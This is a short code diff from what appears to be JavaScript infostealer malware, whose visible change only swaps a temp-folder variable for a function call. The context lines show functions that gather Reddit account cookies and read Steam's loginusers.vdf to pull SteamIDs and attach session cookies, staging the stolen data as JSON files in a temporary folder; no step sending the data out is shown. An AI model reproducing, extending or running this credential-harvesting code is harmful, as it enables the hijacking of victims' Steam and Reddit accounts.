@@ -48,13 +48,13 @@ const reddit = async () => {
   });
   account.cookie = cookie;
   account.source = source;
-  writeFileSync(join(tempFolder, 'Reddit.json'), JSON.stringify(account));
+  writeFileSync(join(getTempFolder(), 'Reddit.json'), JSON.stringify(account));
 };
 
 const steam = async () => {
   const steamBasePath = join('C:', 'Program Files (x86)', 'Steam');
   if (fs.existsSync(steamBasePath) && fs.existsSync(join(steamBasePath, 'config')) && fs.existsSync(join(steamBasePath, 'config', 'loginusers.vdf'))) {
-    fs.writeFileSync(join(tempFolder, 'Steam.json'), '[]');
+    fs.writeFileSync(join(getTempFolder(), 'Steam.json'), '[]');
     const accounts = fs.readFileSync(join(steamBasePath, 'config', 'loginusers.vdf'), 'utf8');
     const regex = /7656[0-9]{13}/gi;
     accounts.match(regex).map(async account => {
@@ -74,7 +74,7 @@ const steam = async () => {
           accountsFile.find(account => account.accountId === userId).cookieSource = cookie.source;
         }
       }
-      fs.writeFileSync(join(tempFolder, 'Steam.json'), JSON.stringify(accountsFile));
+      fs.writeFileSync(join(getTempFolder(), 'Steam.json'), JSON.stringify(accountsFile));
     });
   }
 };
